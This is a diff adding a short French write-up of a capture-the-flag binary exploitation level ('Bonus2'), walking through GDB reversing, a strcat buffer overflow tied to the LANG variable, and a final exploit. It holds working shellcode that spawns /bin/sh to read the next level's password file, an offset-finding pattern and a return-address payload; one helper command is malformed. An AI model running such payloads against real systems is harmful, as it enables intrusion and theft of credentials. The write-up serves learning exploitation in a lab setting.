@@ -1,0 +1,26 @@
+Bonus2:
+
+On lance le programme sans arguments, cela ne fait aucune sortie. On lance avec des arguments random il affiche "Hello {args1}". On lance GDB et on disas le main. On voit de multiples calls a strncpy, un call a getenv et du memcmp. On break sous le memcmp <b *main+173> pour voir ses arguments. On tombe sur "en_US_.UTF-8" on peut donc deduire que getenv permet de recuperer la variable d'environnement "LANG". On voit aussi avec "x/s $edx" que la comparaison se fait avec "fi". On tente de relancer le programme avec un export LANG=fi. Le programme affiche Hello en finnois. On repete le meme processus pour les autres memcmp on a "fi" et "nl". Dans la fonction greetings on voit un strcat qui concatene le message de bienvenue et l'argv[1]. C'est sans doute ici que l'on va pouvoir overflow. On peut augmenter la taille de l'overflow en mettant la langue sur fi. On utilise export pour mettre not shellcode dans l'env:
+
+export SHELLCODE=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus3/.pass;"'`
+
+On ecrit un programme pour trouver son adresse en memoire:
+vim /tmp/getshellcode.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int		main(int argc, char **argv)
+{
+		printf("SHELLCODE: %p\n", getenv("SHELLCODE"));
+		return (0);
+}
+
+cd /tmp / && getshellcode.c
+
+On determine l'offset d'attaque avec GDB. 
+export LANG=fi
+/home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac = 0x41366141 = 18.
+
+On genere donc le payload:
+./bonus2 `python -c 'print "A" * 40 + " " + "B" * 18 + "\x67\xf8\xff\xbf" + "B" '`
